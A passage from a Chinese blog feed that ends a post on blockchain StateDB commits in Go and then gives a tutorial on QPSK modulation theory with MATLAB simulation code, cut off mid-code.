class="hljs-comment">//storage树根哈希值</span><br>Root <span class="hljs-keyword">string</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到 stateObject 中维护关于某个账户的所有信息，涉及账户地址、账户地址哈希、底层数据库、存储树等内容。<br>在区块中，将交易作为输入条件，来根据一系列动作修改状态。 在完成区块挖矿前，只是获得在内存中的状态树的 Root 值。 StateDB 可视为一个内存数据库，状态数据先在内存数据库中完成修改，所有关于状态的计算都在内存中完成。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//将每个交易对应的的账户状态树进行修改</span><br>usr := getUserByAddress(t.Address)<br><span class="hljs-keyword">if</span> usr.Amount - t.Fee &lt;<span class="hljs-number">0</span> &#123;<br>    <span class="hljs-keyword">return</span> err<br>&#125;<br>usr.Nonce = usr.Nonce + <span class="hljs-number">1</span><br>uMPT := getMPT(usr.Root)<br>data := *(*[]<span class="hljs-keyword">byte</span>)(unsafe.Pointer(&amp;t))<br>uMPT.Put([]<span class="hljs-keyword">byte</span>(t.Hash),data)<br>usr.Root := uMPT.RootHash()<br></code></pre></td></tr></table></figure><p>在将区块持久化时完成有内存到数据库的更新存储，此更新属于增量更新，仅仅修改涉及到被修改部分。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// state/statedb.go:122</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *StateDB)</span> <span class="hljs-title">Commit</span><span class="hljs-params">(deleteEmptyObjects <span class="hljs-keyword">bool</span>)</span> <span class="hljs-params">(root hash.Hash, err error)</span></span> &#123;<br><span class="hljs-keyword">for</span> addr := <span class="hljs-keyword">range</span> s.journal.dirties &#123;<span class="hljs-comment">//①⑧⑨⑩</span><br>s.stateObjectsDirty[addr] = <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>&#125;<br><span class="hljs-keyword">for</span> addr, stateObject := <span class="hljs-keyword">range</span> s.stateObjects &#123;<span class="hljs-comment">//②</span><br>_, isDirty := s.stateObjectsDirty[addr]<br><br>        <span class="hljs-keyword">if</span> isDirty&#123;<br><span class="hljs-comment">//如果集合中的账户有变更</span><br><span class="hljs-keyword">if</span> err := stateObject.CommitTrie(s.db); err != <span class="hljs-literal">nil</span> &#123;<span class="hljs-comment">//⑤</span><br><span class="hljs-keyword">return</span> common.Hash&#123;&#125;, err<br>&#125;<br>s.updateStateObject(stateObject)<span class="hljs-comment">//需要提交此账户</span><br>  &#125;<br><span class="hljs-built_in">delete</span>(s.stateObjectsDirty, addr)<br>    &#125;<br>    &#125;<br><span class="hljs-comment">//...</span><br>root, err = s.trie.Commit(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(leaf []<span class="hljs-keyword">byte</span>, parent hash.Hash)</span> <span class="hljs-title">error</span></span> &#123;<span class="hljs-comment">//⑦</span><br><span class="hljs-keyword">var</span> account Account<br><span class="hljs-keyword">if</span> err := rlp.DecodeBytes(leaf, &amp;account); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">if</span> account.Root != emptyRoot &#123;<br>s.db.TrieDB().Reference(account.Root, parent)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;)<br><span class="hljs-keyword">return</span> root, err<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>因为在修改某账户信息是，将会记录变更流水（journal），因此在提交保存修改时只需要将在流水中存在的记录作为修改集 ①。</li><li>所有访问过的账户信息，均被记录在 stateObjects 中，只需要遍历此集合 ② 便可以提交所有修改。</li><li>处理完每个需要提交的账户内容外，最后需要将账户树提交 ⑦。在提交过程中涉及账户内容作为叶子节点，在发送变动时，将更新账户节点和父节点的关系。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>QPSK信号调制</title>
      <link href="/2021/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6/"/>
      <url>/2021/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>b 测题目，由于学长写的代码有些步骤无法理解，而且代码不优雅，故重写之。</p><a id="more"></a><h1 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h1><ol><li>源码信号为周期 63bits 的 m 序列， 源码比特速率（kbps） 数值上= 载波频率（kHz），数值范围 5—100，在数值范围内任取整数；</li><li>在 MATLAB 环境中编写 M 代码搭建 QPSK 调制系统模型；</li><li>观测基带时域波形、已调信号时域波形；</li><li>观测基带发射星座图；</li><li>观测已调信号的功率谱（优先）或频谱；</li></ol><h1 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h1><h2 id="比特率"><a href="#比特率" class="headerlink" title="比特率"></a>比特率</h2><p>比特率(bit rate)又称传信率、信息传输速率(简称信息速率，information rate)。其定义是：<strong>通信线路(或系统)单位时间(每秒)内传输的信息量，即每秒能传输的二进制位</strong>数，通常用 Rb 表示，其单位是比特/秒(bit/s 或 b/s，英文缩略语为 bps)。　　<br>在二进制系统中，信息速率(比特率)与信号速率(波特率)相等，例如，当系统以每秒 50 个二进制符号传输时，信息速率为 50bit/s，信号速率也为 50Bd(波特)。在无调制的情况下，比特率等于波特率；采用调相技术时，比特率不等于波特率。通信系统的发送设备和接收设备必须在相同的波特率下工作，否则会出现帧同步错误。</p><h2 id="波特率"><a href="#波特率" class="headerlink" title="波特率"></a>波特率</h2><p>波特率(Baud rate)又称传码率、码元传输速率(简称码元速率)、信号传输速率(简称信号速率，signaling rate)或调制速率。其定义是：<strong>通信线路(或系统)单位时间(每秒)内传输的码元(脉冲)个数</strong>；或者表示信号调制过程中，单位时间内调制信号波形的变换次数，通常用 RB 表示，单位是波特(Bd 或 Baud，前者规范)。如果每秒传输 1 个码元就称为 1Bd；如果 1 码元的时间长短为 200ms，则每秒可传输 5 个码元，那么码元速率(波特率)就是 5Bd。　　<br>波特率(码元速率)并没有限定是何种进制的码元，所以给出波特率时必须说明这个码元的进制。对于 M 进制码元，比特率(信息速率)Rb 与波特率(码元速率)RB 的关系式为　　<br>Rb=RB·lbM 　　<br>式中：lbM=log2M，表示 M 的以 2 为底的对数。显然，对于二进制码元，由于 lb2=1，所以 Rb=RB，即波特率与比特率在数值上相等，但单位不同，也即二者代表的意义不同。　　<br>例如，波特率为 600Bd，则在二进制时，比特率也为 600bit/s；在四进制时，由于 lb4=2，所以比特率为 1200bit/s。可见，在一个码元中可以传送多个比特。</p><h2 id="数据传输率"><a href="#数据传输率" class="headerlink" title="数据传输率"></a>数据传输率</h2><p>数据传输率(data transfer rate)又称数据传输速率、数据传送率。其定义是：<strong>通信线路(或系统)单位时间(每秒)内传输的字符个数</strong>；或者单位时间(每秒)内传输的码组(字块)数或比特数。其单位是字符/秒；或者码组/秒、比特/秒(可见，当数据传输率用“bit/s”作单位时，即等于比特率)。 <strong>所以它的单位在不同的应用中是不同的。</strong>　<br>　例如，在某计算机异步串行通信系统中，数据传输率为 960 字符/s，每个字符包括 1 个起始位、8 个数据位、1 个停止位，则对应的比特率为 10×960 位/s=9600 位/s=9600bit/s；因为是二进制编码，所以对应的波特率也为 9600Bd。<strong>可见，在我们平时用的串口通信中，波特率是 9600Bd，其实比特率也是 9600bps，因为默认就是 2 进制，波特率和比特率就是 M 进制的差别。</strong></p><h2 id="采样频率-fs"><a href="#采样频率-fs" class="headerlink" title="采样频率 fs"></a>采样频率 fs</h2><p>定义：<strong>每秒从连续信号中提取并组成离散信号的采样个数。</strong><br>采样次数 Ns，每个码元被采样的次数，必须为 2 的幂。<br>fs=fb*Ns<br>其中 fb 为波特率，每秒能传输的二进制位数。</p><blockquote><p>实际中，要处理的为模拟信号，想要在数字系统中处理必须为数字信号，即采用抽样、量化、编码的处理方案。<br>处理的第一步为<strong>抽样</strong>，即模数转换。以电话为例，每秒 3000 次取样，每个取样是 7 比特，那么电话的比特率是 21000。而 CD 是每秒 44100 次取样，两个声道，每个取样是 13 位 PCM 编码，所以 CD 的比特率是 44100_2_13=1146600，这个参数也被称为数据带宽，它和 ADSL 中的带宽是一个概念。将码率除以 8,就可以得到这个它的数据速率，1146600/8=143325，也就是说 CD 每秒的数据量大约是 144KB，而一张 CD 的容量是 74 分等于 4440 秒，就是 639360KB ＝ 640MB。即刚好为一张 cd 的容量。</p></blockquote><h2 id="快速傅里叶变换-FFT"><a href="#快速傅里叶变换-FFT" class="headerlink" title="快速傅里叶变换 FFT"></a>快速傅里叶变换 FFT</h2><p>做 n 个点的 FFT，表示在时域上对原来的信号取了 n 个点来做频谱分析，n 点 FFT 变换的结果仍为 n 个点。<br>换句话说，就是将 2pi 数字频率 w 分成 n 份，而整个数字频率 w 的范围覆盖了从 0-2pi*fs 的模拟频率范围。这里的 fs 是<strong>采样频率</strong>。根据<strong>奈科斯特定律</strong>，只有 f=fs/2 范围内的信号才是被采样到的有效信号。<br>举例说，如果做了 16 个点的 FFT 分析，你原来的模拟信号的最高频率 f=32kHz，采样频率是 64kHz，n 的范围是 0,1,2…15。（注：这意味着已经将原来的模拟信号采样了 8 遍。）这时，64kHz 的模拟频率被分成了 16 分，每一份是 4kHz，这个叫<strong>频率分辨率</strong>（卢注：做 FFT 用的点越多，频率分辨率越高）。那么在横坐标中，n=1 时对应的 f 是 4kHz, n=2 对应的是 8kHz, n=15 时对应的是 60kHz，你的频谱是关于 n=8 对称的。你只需要关心 n=0 到 7 以内的频谱就足够了，因为，原来信号的最高模拟频率是 32kHz。<br><a href="https://blog.csdn.net/weixin_39591031/article/details/110392352">https://blog.csdn.net/weixin_39591031/article/details/110392352</a></p><h2 id="QPSK"><a href="#QPSK" class="headerlink" title="QPSK"></a>QPSK</h2><p>QPSK 又叫<strong>四相绝对相移调制（4PSK）</strong>，QPSK 利用载波的四种不同相位来表征数字信息。它的频带利用率高，是 BPSK(二相相移键控）的 2 倍。当数据码元速率相同时，QPSK 信号的传输波特率为 BPSK 信号的传输波特率的一半，所以 QPSK 的传输带宽是 BPSK 信号的一半。QPSK 调制技术的抗干扰能力强，采用相干检测时其误码性能与 BPSK 相同，故得到广泛应用。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1619531534558-8d91fa5c-dbbd-49b5-8f7b-f13d77cfab4d.png#clientId=u6d886849-8a59-4&from=paste&height=86&id=u40231118&name=image.png&originHeight=172&originWidth=922&originalType=binary&size=45922&status=done&style=none&taskId=u80ca2014-1869-4d49-b7f8-d1456c86125&width=461" alt="image.png"><br>写成正交形式：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1619531584760-a83d601f-727c-49ac-bb65-4dc6dfd36ee0.png#clientId=u6d886849-8a59-4&from=paste&height=149&id=u0c5731d0&name=image.png&originHeight=297&originWidth=1117&originalType=binary&size=83630&status=done&style=none&taskId=u3fd5ace3-945e-4eac-bc13-dac014e29e4&width=558.5" alt="image.png"><br>QPSK 调制是利用载波的 4 种不同相位来表征数字信息。每一种载波相位代表两个比特的信息。例如，若输入二进制数字信息，序列为 10011100，…，则应该先将其进行分组，每两个比特编为一组。可将它们分为 10，01，11，00 等，然后分别用四种不同的相位来表示。故每个四进制码元又称为双比特码元。把组成双比特码元的前一个信息比特用 a 表示，后一个信息比特用 b 表示。双比特码元中两个信息比特 ab 与载波相位的矢量关系如图 1 所示。图（a）表示 A 方式时 QPSK 信号矢量图，图（b）表示 B 方式时 QPSK 信号的矢量图。由于正弦和余弦的互补特性，对于载波相位的四种取值，在 A 方式中：0°、90°、180°、270°，则数据通过处理后输岀的成形波形幅度有三种取值；B 方式中：45°、135°、225°、315°，则数据通过处理后输出的成形波形幅度有两种取值。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1619531517974-bef882de-e87c-4feb-804a-bacdb59b2ab8.png#clientId=u6d886849-8a59-4&from=paste&height=115&id=u633a436c&name=image.png&originHeight=230&originWidth=750&originalType=binary&size=26531&status=done&style=none&taskId=u44ca49f7-2450-4bb0-841f-6fa8556732d&width=375" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1619531415499-a8148e64-2153-4803-be0e-590148b9fb33.png#clientId=u6d886849-8a59-4&from=paste&height=185&id=uce77a3fe&name=image.png&originHeight=185&originWidth=446&originalType=binary&size=14966&status=done&style=none&taskId=u3c682ff6-2ff7-415e-b46c-5a165526cd4&width=446" alt="image.png"><br>在本次实验中我们采取 B 方式进行调制。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1619531483785-9e17fbda-c592-47e7-bc28-8807c3a9511a.png#clientId=u6d886849-8a59-4&from=paste&height=242&id=ucdfabb2a&name=image.png&originHeight=284&originWidth=676&originalType=binary&size=17711&status=done&style=none&taskId=u40e11ebc-b2ee-4601-b62f-71e844d08ee&width=576" alt="image.png"><br>原理图如上。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1619531617498-6f6cfe45-692b-4bb0-b36d-f936d85d1cc6.png#clientId=u6d886849-8a59-4&from=paste&height=185&id=u45ba068d&name=image.png&originHeight=370&originWidth=835&originalType=binary&size=66431&status=done&style=none&taskId=u3a4a4871-452c-400d-847a-470c345f1da&width=417.5" alt="image.png"></p><h2 id="QPSK-的功率谱"><a href="#QPSK-的功率谱" class="headerlink" title="QPSK 的功率谱"></a>QPSK 的功率谱</h2><p>由于 QPSK 信号可被理解为由同相支路和正交支路两路 2PSK 叠加而成，但是载波的幅度与码元速率不同，因此 QPSK 信号的功率谱密度相当于 2PSK 信号的功率谱密度的线性叠加：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1619531680828-16f2737a-cd7a-479d-a0dc-8db721c0dbb9.png#clientId=u6d886849-8a59-4&from=paste&height=49&id=u60898145&name=image.png&originHeight=98&originWidth=663&originalType=binary&size=21889&status=done&style=none&taskId=u7f7c99c7-14ab-4639-a548-05a3d1a2b02&width=331.5" alt="image.png"><br>因此 QPSK 信号的功率谱示意图如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1619531693665-aebb5af0-b881-44c5-ae5a-70e98076e064.png#clientId=u6d886849-8a59-4&from=paste&height=147&id=u8a6de52d&name=image.png&originHeight=294&originWidth=737&originalType=binary&size=35568&status=done&style=none&taskId=u57056394-5a0d-4c56-a71b-f833cbdb882&width=368.5" alt="image.png"><br>由上图可以看出其带宽等于基带码元速率，峰值频率为等于载波频率。</p><h2 id="星座图的基本概念"><a href="#星座图的基本概念" class="headerlink" title="星座图的基本概念"></a>星座图的基本概念</h2><p>在数字通信领域中，经常将数字信号在复平面上表示，以直观的表示信号以及信号之间的关系，这种图示就是星座图。星座图可以看成数字信号的一个“二维眼图”阵列，同时符号在图中所处的位置具有合理的限制或判决边界。如果要将数字信号发送出去，一般不会直接发 0 或 1，而是先将 0,1 信号（bit）按照一个或者几个组成一组，比如每两个 bit 组成一组，即有 00,01,10,11，总共四种状态，此时可以选择 QPSK 调制，QPSK 四个点组成一个 QPSK 的星座图，每个点与相邻的点相差 90 度（幅度是相同的），一个星座点对应一个调制符号。星座图的作用主要是在调制时用于映射，而接收时用于判断发送的到底是哪个点，从而正确解调数据。</p><h1 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h1><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs matlab">clear all;clc;<br><span class="hljs-comment">%% 生成伪随机码</span><br><br>len = <span class="hljs-number">64</span>;<br><br>orderNum = <span class="hljs-number">6</span>;<span class="hljs-comment">%m序列为6阶</span><br><br>xulie = idinput((<span class="hljs-number">2</span>^orderNum<span class="hljs-number">-1</span>),<span class="hljs-string">&#x27;prbs&#x27;</span>);<span class="hljs-comment">% 生成伪随机序列,长度为63</span><br><br>fb = <span class="hljs-number">10</span>; <span class="hljs-comment">% 波特率10kHz ,比特率值=波特率值,每秒能传输的二进制位数</span><br><br>Ns = <span class="hljs-number">64</span>; <span class="hljs-comment">% 采样次数</span><br><br>fs=fb*Ns; <span class="hljs-comment">% 采样频率,每秒从连续信号中提取并组成离散信号的采样个数</span><br><br>fc = fb; <span class="hljs-comment">%载波频率=比特率</span><br><br>dt=<span class="hljs-number">1</span>/fs; <span class="hljs-comment">% 采样时间,又称时域采样间隔</span><br><br>Ts = dt;<br><br>N = Ns*<span class="hljs-built_in">length</span>(xulie); <span class="hljs-comment">% 总采样点个数</span><br><br><br><span class="hljs-comment">%% 生成两路调制信号</span><br><br>I_carrier = <span class="hljs-built_in">zeros</span>(<span class="hljs-number">1</span>,N);<br>Q_carrier = <span class="hljs-built_in">zeros</span>(<span class="hljs-number">1</span>,N);<br>I = <span class="hljs-built_in">zeros</span>(<span class="hljs-number">1</span>,N);<br>Q = <span class="hljs-built_in">zeros</span>(<span class="hljs-number">1</span>,N);<br><br><span class="hljs-comment">%采用绘图比较I、Q比特流</span><br>bit_data=<span class="hljs-built_in">zeros</span>(<span class="hljs-number">1</span>,N);<br><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:len<span class="hljs-number">-1</span><br>    bit_data(Ns*(<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)+<span class="hljs-number">1</span>:Ns*<span class="hljs-built_in">i</span>)=xulie(<span class="hljs-built_in">i</span>);<span class="hljs-comment">%在一个比特周期里面有Fs个1和采样点一模一样</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-comment">%对奇数抽样</span><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:len/<span class="hljs-number">2</span><br>    I(<span class="hljs-number">2</span>*Ns*(<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)+<span class="hljs-number">1</span>:<span class="hljs-number">2</span>*Ns*<span class="hljs-built_in">i</span>) = xulie(<span class="hljs-number">2</span>*<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>);<br><span class="hljs-keyword">end</span><br><span class="hljs-comment">%对偶数采样</span><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:len/<span class="hljs-number">2</span><span class="hljs-number">-1</span><br>    Q(<span class="hljs-number">2</span>*Ns*(<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)+<span class="hljs-number">1</span>:<span class="hljs-number">2</span>*Ns*<span class="hljs-built_in">i</span>) = xulie(<span class="hljs-number">2</span>*<span class="hljs-built_in">i</span>);<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:N<br>    I_carrier(<span class="hljs-built_in">i</span>) = <span class="hljs-built_in">cos</span>(<span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span>*fc*(<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)/(fs));<br>    Q_carrier(<span class="hljs-built_in">i</span>) = -<span class="hljs-built_in">sin</span>(<span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span>*fc*(<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)/(fs));<br><span class="hljs-keyword">end</span><br><span class="hljs-comment">%补充采样（最后一个采样点）</span><br>I_carrier = [I_carrier,<span class="hljs-built_in">ones</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>)*<span class="hljs-built_in">cos</span>(<span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span>*fc*(<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)/(fs))];<br>Q_carrier = [Q_carrier,<span class="hljs-built_in">zeros</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>)];<br>Q = [Q,<span class="hljs-built_in">zeros</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>)];<br><br>T = N*dt*fb; <span class="hljs-comment">% 截断时间</span><br><br><span class="hljs-comment">%绘图</span><br><span class="hljs-built_in">figure</span>();<br>subplot(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br><span class="hljs-built_in">plot</span>(bit_data,<span class="hljs-string">&#x27;color&#x27;</span>,[<span class="hljs-number">55</span>/<span class="hljs-number">255</span> <span class="hljs-number">108</span>/<span class="hljs-number">255</span> <span class="hljs-number">176</span>/<span class="hljs-number">255</span>]);<span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;Bitstream&#x27;</span>)<span class="hljs-comment">%比特信息</span><br>subplot(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br><span class="hljs-built_in">plot</span>(I,<span class="hljs-string">&#x27;color&#x27;</span>,[<span class="hljs-number">55</span>/<span class="hljs-number">255</span> <span class="hljs-number">108</span>/<span class="hljs-number">255</span> <span class="hljs-number">176</span>/<span class="hljs-number">255</span>]);<span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;I Bitstream&#x27;</span>)<span class="hljs-comment">%I路信息</span><br>subplot(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)<br><span class="hljs-built_in">plot</span>(Q,<span class="hljs-string">&#x27;color&#x27;</span>,[<span class="hljs-number">55</span>/<span class="hljs-number">255</span> <span class="hljs-number">108</span>/<span class="hljs-number">255</span> <span class="hljs-number">176</span>/<span class="hljs-number">255</span>]);<span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;Q Bitstream&#x27;</span>)<span class="hljs-comment">%Q路信息</span><br><span class="hljs-comment">%% 调制</span><br><br>I_data = I.*I_carrier;<br>Q_data = Q.*Q_carrier;<br>QPSK_data = (I_data + Q_data)/<span class="hljs-built_in">sqrt</span>(<span class="hljs-number">2</span>);<br><br><span class="hljs-built_in">figure</span>();<span class="hljs-comment">%产生一个新图</span><br>subplot(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br><span class="hljs-built_in">plot</span>(I_data,<span class="hljs-string">&#x27;color&#x27;</span>,[<span class="hljs-number">55</span>/<span class="hljs-number">255</span> <span class="hljs-number">108</span>/<span class="hljs-number">255</span> <span class="hljs-number">176</span>/<span class="hljs-number">255</span>]);<span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;I signal&#x27;</span>)<span class="hljs-comment">%I路信号</span><br>subplot(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br><span class="hljs-built_in">plot</span>(Q_data,<span class="hljs-string">&#x27;color&#x27;</span>,[<span class="hljs-number">55</span>/<span class="hljs-number">255</span> <span class="hljs-number">108</span>/<span class="hljs-number">255</span> <span class="hljs-number">176</span>/<span class="hljs-number">255</span>]);<span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;Q signal&#x27;</span>)<span class="hljs-comment">%Q路信号</span><br>subplot(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)<br><span class="hljs-built_in">plot</span>(QPSK_data,<span class="hljs-string">&#x27;color&#x27;</span>,[<span class="hljs-number">55</span>/<span class="hljs-number">255</span> <span class="hljs-number">108</span>/<span class="hljs-number">255</span> <span class="hljs-number">176</span>/<span class="hljs-number">255</span>]);<span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;QPSK signal&#x27;</span>)<span class="hljs-comment">%QPSK信号</span><br><br><span class="hljs-comment">%% 频谱</span><br>Bs =fs/<span class="hljs-number">2</span>; <span class="hljs-comment">% 系统带宽</span><br>QPSK = <span class="hljs-built_in">abs</span>(fftshift(fft(QPSK_data,N)));<br>ff = <span class="hljs-built_in">linspace</span>(-Bs,Bs,N); <span class="hljs-comment">% 频域横坐标</span><br><span class="hljs-built_in">figure</span>()<br><span class="hljs-built_in">plot</span>(ff,QPSK,<span class="hljs-string">&#x27;color&#x27;</span>,[<span class="hljs-number">55</span>/<span class="hljs-number">255</span> <span class="hljs-number">108</span>/<span class="hljs-number">255</span> <span class="hljs-number">176</span>/<span class="hljs-number">255</span>])<br><span class="hljs-comment">%axis([-50,50,0,60]);</span><br>title(<span class="hljs-string">&#x27;QPSK调制信号频谱图&#x27;</span>);<br>xlabel(<span class="hljs-string">&#x27;f/kHz&#x27;</span>);<br>ylabel(<span class="hljs-string">&#x27;频谱&#x27;</span>);<br><span class="hljs-comment">%% 功率谱密度</span><br>Bs =fs/<span class="hljs-number">2</span>; <span class="hljs-comment">% 系统带宽</span><br>QPSK = <span class="hljs-number">10</span>*<span class="hljs-built_in">log10</span>(<span class="hljs-built_in">abs</span>(fftshift(fft(QPSK_data,N))).^<span class="hljs-number">2</span>/T);<br>ff = <span class="hljs-built_in">linspace</span>(-Bs,Bs,N); <span class="hljs-comment">% 频域横坐标</span><br><span class="hljs-built_in">figure</span>()<br><span class="hljs-built_in">plot</span>(ff,QPSK,<span class="hljs-string">&#x27;color&#x27;</span>,[<span class="hljs-number">55</span>/<span class="hljs-number">255</span> <span class="hljs-number">108</span>/<span class="hljs-number">255</span> <span class="hljs-number">176</span>/<span class="hljs-number">255</span>])<br>axis([<span class="hljs-number">-50</span>,<span class="hljs-number">50</span>,<span class="hljs-number">0</span>,<span class="hljs-number">60</span>]);<br>title(<span class="hljs-string">&#x27;QPSK调制信号功率谱图&#x27;</span>);<br>xlabel(<span class="hljs-string">&#x27;f/kHz&#x27;</span>);<br>ylabel(<span class="hljs-string">&#x27;功率谱密度/db&#x27;</span>);<br><span class="hljs-comment">%% 绘制星座图</span><br><br>signal = <span class="hljs-built_in">cat</span>(<span class="hljs-number">2</span>, I&#x27;, Q&#x27;);         <span class="hljs-comment">% 将两路串行信号码元合并在一个length(xulie)*2的矩阵中</span><br><br>[a1,~]=<span class="hljs-built_in">find</span>(signal(:,<span class="hljs-number">1</span>)==<span class="hljs-number">-1</span>&amp;signal(:,<span class="hljs-number">2</span>)==<span class="hljs-number">-1</span>);       <span class="hljs-comment">% 返回满足条件的矩阵元素对应的坐标</span><br><br>xinzuotu(a1)=<span class="hljs-number">-1</span><span class="hljs-number">-1</span><span class="hljs-built_in">i</span>;<br><br>[a2,~]=<span class="hljs-built_in">find</span>(signal(:,<span 